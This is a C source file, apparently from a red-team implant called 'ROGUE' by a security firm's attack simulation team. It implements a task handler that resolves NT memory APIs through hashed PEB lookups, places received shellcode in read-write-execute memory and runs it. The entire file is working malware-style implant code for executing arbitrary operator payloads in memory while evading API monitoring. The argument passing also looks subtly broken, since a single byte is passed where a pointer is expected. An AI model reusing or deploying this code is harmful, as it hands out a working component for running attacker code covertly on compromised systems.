/*!
 *
 * ROGUE
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct __attribute__(( packed, scalar_storage_order( "big-endian" ) ))
{
	UINT32	BufLength;
	UINT32	ArgLength;
	UCHAR	Buf[ 0 ];
	UCHAR	Arg[ 0 ];
} SHELLCODE_TASK, *PSHELLCODE_TASK ;

typedef struct
{
	D_API( NtAllocateVirtualMemory );
	D_API( NtFreeVirtualMemory );
} API ;

typedef struct
{
	D_API( RogueOutput );
	D_API( RoguePrintf );
} ROGUE_API, *PROGUE_API ;

typedef DWORD ( * INLINE_EXECUTE_FUNC )(
		PROGUE_API,
		PROGUE_CTX,
		USHORT,
		PVOID,
		UINT32,
		PBUFFER
);

/* API Hashes */
#define H_API_NTALLOCATEVIRTUALMEMORY		0xf783b8ec /* NtAllocateVirtualMemory */
#define H_API_NTFREEVIRTUALMEMORY		0x2802c609 /* NtFreeVirtualMemory */

/* LIB Hashes */
#define H_LIB_NTDLL				0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Executes a custom inline task and return its output.
 *
!*/
D_SEC( B ) DWORD TaskInlineExecute( _In_ PROGUE_CTX Context, _In_ USHORT Uid, _In_ PVOID Buffer, _In_ UINT32 Length, _In_ PBUFFER Output )
{
	API			Api;
	ROGUE_API		Rpi;

	DWORD			Ret = ErrorAction;
	SIZE_T			Len = 0;

	PVOID			Mem = NULL;
	PSHELLCODE_TASK		Tsk = NULL;
	INLINE_EXECUTE_FUNC	Fcn = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Rpi, sizeof( Rpi ) );

	/* Set pointers */
	Tsk = C_PTR( Buffer );
	Len = Tsk->BufLength;

	/* Set API pointers */
	Api.NtAllocateVirtualMemory = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTALLOCATEVIRTUALMEMORY );
	Api.NtFreeVirtualMemory     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTFREEVIRTUALMEMORY );

	/* Create a buffer to hold the task */
	if ( NT_SUCCESS( Api.NtAllocateVirtualMemory( NtCurrentProcess(), &Mem, 0, &Len, MEM_COMMIT, PAGE_EXECUTE_READWRITE ) ) ) {
		/* Copy over the position independent task */
		__builtin_memcpy( Mem, Tsk->Buf, Tsk->BufLength );

		/* Set pointers for the output */
		Rpi.RogueOutput = C_PTR( G_PTR( RogueOutput ) );
		Rpi.RoguePrintf = C_PTR( G_PTR( RoguePrintf ) );

		/* Set pointer and execute the inline function */
		if ( Tsk->ArgLength != 0 ) {
			Fcn = C_PTR( Mem ); Ret = Fcn( &Rpi, Context, Uid, Tsk->Buf[ Tsk->BufLength ], Tsk->ArgLength, Output );
		} else {
			Fcn = C_PTR( Mem ); Ret = Fcn( &Rpi, Context, Uid, NULL, 0, Output );
		};

		/* Cleanup */
		Len = 0; 
		Api.NtFreeVirtualMemory( NtCurrentProcess(), &Mem, &Len, MEM_RELEASE );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Rpi, sizeof( Rpi ) );

	/* Return */
	return Ret;
};
